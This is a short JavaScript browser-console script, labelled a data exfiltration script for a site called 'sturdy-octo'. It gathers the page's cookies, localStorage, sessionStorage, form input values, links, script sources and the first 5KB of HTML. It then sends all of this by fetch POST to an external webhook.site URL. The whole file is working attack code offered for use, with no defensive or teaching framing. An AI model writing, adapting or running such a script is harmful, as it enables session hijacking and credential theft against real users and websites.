// STURDY-OCTO DATA EXFILTRATION SCRIPT
// Run this in the browser console on sturdy-octo

// STEP 1: Get your webhook URL
const WEBHOOK = "https://webhook.site/YOUR-WEBHOOK-URL"; // REPLACE THIS!

// STEP 2: Collect all data
const data = {
    url: location.href,
    cookies: document.cookie,
    localStorage: JSON.parse(JSON.stringify(localStorage)),
    sessionStorage: JSON.parse(JSON.stringify(sessionStorage)),
    forms: [...document.querySelectorAll('form')].map(f => ({
        action: f.action,
        method: f.method,
        inputs: [...f.querySelectorAll('input')].map(i => ({
            name: i.name,
            type: i.type,
            value: i.value
        }))
    })),
    links: [...document.querySelectorAll('a')].map(a => a.href),
    scripts: [...document.querySelectorAll('script')].map(s => s.src),
    title: document.title,
    html: document.documentElement.outerHTML.substring(0, 5000) // First 5KB
};

// STEP 3: Exfiltrate data
fetch(WEBHOOK, {
    method: 'POST',
    body: JSON.stringify(data),
    headers: {'Content-Type': 'application/json'}
}).then(() => console.log('Data exfiltrated!'));

// STEP 4: Show what we found
console.log('=== EXFILTRATED DATA ===');
console.log('URL:', data.url);
console.log('Cookies:', data.cookies);
console.log('LocalStorage keys:', Object.keys(data.localStorage));
console.log('SessionStorage keys:', Object.keys(data.sessionStorage));
console.log('Forms:', data.forms.length);
console.log('Links:', data.links.length);
console.log('Scripts:', data.scripts.length);

// Return data for inspection
data;
